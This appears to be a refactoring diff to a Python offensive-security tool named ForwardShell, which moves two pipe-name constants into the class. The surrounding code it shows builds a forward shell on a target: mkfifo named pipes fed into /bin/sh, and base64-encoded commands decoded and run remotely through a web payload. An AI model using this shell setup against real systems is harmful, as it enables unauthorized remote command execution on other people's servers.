@@ -31,24 +31,23 @@ import threading
 import random
 import string
 import re
-
-import requests
-
 from importlib import import_module
 from base64 import b64encode
 from time import sleep
 
+import requests
 from termcolor import colored, cprint
 
 from core.updater import updater
 from core.parser import cliOptions
 from core.common import BANNER
 
-INPUT = 'fwdshin'
-OUTPUT = 'fwdshout'
-
 
 class ForwardShell:
+	
+	INPUT = 'fwdshin'
+	OUTPUT = 'fwdshout'
+
 	def __init__(self, url, proxies, payloadName, genPayload, pipesPath, interval=1.3):
 		self._url = url
 		self._proxies = proxies
@@ -58,9 +57,9 @@ class ForwardShell:
 		self._delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
 		self._session = random.randrange(10000, 99999)
-		self._stdin = f'{pipesPath}/{INPUT}.{self._session}'
-		self._stdout = f'{pipesPath}/{OUTPUT}.{self._session}'
-		cprint(f'[*] Session path & ID: {pipesPath}/{INPUT}.{self._session}', 'green')
+		self._stdin = f'{pipesPath}/{self.INPUT}.{self._session}'
+		self._stdout = f'{pipesPath}/{self.OUTPUT}.{self._session}'
+		cprint(f'[*] Session path & ID: {pipesPath}/{self.INPUT}.{self._session}', 'green')
 
 		cprint('[*] Setting up forward shell on target', 'green')
 		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh >& {self._stdout}'
@@ -244,7 +243,7 @@ def main():
 			except KeyboardInterrupt:
 				cprint('\n\n[*] Terminating shell, cleaning up the mess\n', 'green')
 				del sh
-				cmd = f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'
+				cmd = f'rm -f {args.pipes_path}/{ForwardShell.INPUT}.* {args.pipes_path}/{ForwardShell.OUTPUT}.*\n'
 				b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
 				unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh >& /dev/null'
 				ForwardShell.runRawCmd(unwrapAndExec, url, proxies, payloadName, payloadModule.genPayload)
